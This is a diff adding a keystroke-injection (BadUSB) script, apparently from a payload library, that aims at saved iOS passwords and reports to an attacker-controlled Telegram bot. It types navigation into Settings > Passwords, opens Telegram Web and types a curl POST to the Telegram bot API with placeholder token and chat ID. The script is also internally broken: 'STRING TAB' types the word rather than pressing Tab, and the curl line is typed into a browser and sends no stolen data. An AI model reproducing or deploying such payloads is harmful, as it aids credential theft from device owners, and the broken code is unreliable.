@@ -1,0 +1,51 @@
+REM Title: iOS Keychain Access to Telegram
+REM Author: BadUSB Library
+REM Description: Attempts to access keychain and send to Telegram
+REM Target: iOS 14.0+
+REM Category: Authentication
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Settings
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Settings
+ENTER
+DELAY 3000
+
+REM Navigate to Passwords
+STRING Passwords
+ENTER
+DELAY 2000
+
+REM Try to access saved passwords
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+REM Open Safari
+STRING Safari
+ENTER
+DELAY 2000
+
+REM Navigate to Telegram Web
+STRING https://web.telegram.org
+ENTER
+DELAY 3000
+
+REM Send message
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="iOS Keychain Access Attempted"
+ENTER
+DELAY 2000
